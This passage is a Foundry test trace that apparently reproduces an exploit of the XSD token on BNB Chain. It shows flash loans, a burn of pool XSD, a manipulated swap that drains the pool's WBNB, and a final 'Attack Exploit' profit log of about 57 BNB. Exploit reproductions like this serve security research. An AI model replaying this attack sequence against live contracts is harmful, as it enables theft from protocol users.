    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(0x2946Ca638EB11830E83Feaa130aA8B13d37C3772) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 77114640440362412 [7.711e16]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 16325857706505293295 [1.632e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [407] XSD::global_collateral_ratio() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2374] 0xD6cd86a72B03a4C4996923E74FC22EEe7713F908::collat_XSD() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000002444a1321f9dbd6c15051
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [405] XSD::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 20000547033338243084561810 [2e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [610] PIDController::bucket1() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [26525] XSD::burnpoolXSD(3956623826572226095543 [3.956e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [352] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collat_XSD() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000015b42616817e3414b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], to: 0x0000000000000000000000000000000000000000, value: 3956623826572226095543 [3.956e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13144] XSDWETHpool::sync()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] XSD::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 7313572418829758249 [7.313e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3857071215838228063464 [3.857e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 7313572418829758249 [7.313e18], reserve1: 3857071215838228063464 [3.857e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit XSDBurned(param0: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], param1: XSD: [0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6], param2: 3956623826572226095543 [3.956e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3235] XSD::transfer(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], 263932735529288914857295 [2.639e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], value: 263932735529288914857295 [2.639e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [16564] XSDWETHpool::swap(0, 3856964339410199718035 [3.856e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3262] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3856964339410199718035 [3.856e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3856964339410199718035 [3.856e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] XSD::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 263940049101707744615544 [2.639e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 106876428028345429 [1.068e17]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 263940049101707744615544 [2.639e23], reserve1: 106876428028345429 [1.068e17])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 263932735529288914857295 [2.639e23], amount1In: 0, amount0Out: 0, amount1Out: 3856964339410199718035 [3.856e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3262] WBNB::transfer(DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], 1000000000000000000000 [1e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], value: 1000000000000000000000 [1e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1281890073311206736717 [1.281e21]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 135019717032122218788120 [1.35e23]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1281890073311206736717 [1.281e21]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 135019717032122218788120 [1.35e23]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 1000000000000000000000 [1e21], : 0)
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФЬтФА [3262] WBNB::transfer(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 3000000000000000000000 [3e21])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], value: 3000000000000000000000 [3e21])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 3473210513056610755182 [3.473e21]
    тФВ   тФЬтФА [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 175452646497224035954003 [1.754e23]
    тФВ   тФЬтФА [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 3473210513056610755182 [3.473e21]
    тФВ   тФЬтФА [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 175452646497224035954003 [1.754e23]
    тФВ   тФЬтФА emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 3000000000000000000000 [3e21], : 0)
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 56964339410199718035 [5.696e19]
    тФЬтФА [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 56964339410199718035 [5.696e19]
    тФЬтФА [0] console::log("Attack Exploit: %s.%s BNB", 56, 964339410199718035 [9.643e17]) [staticcall]
    тФВ   тФФтФА тЖР [Stop] 
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.83s (9.54s CPU time)

Ran 2 test suites in 10.18s (10.12s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
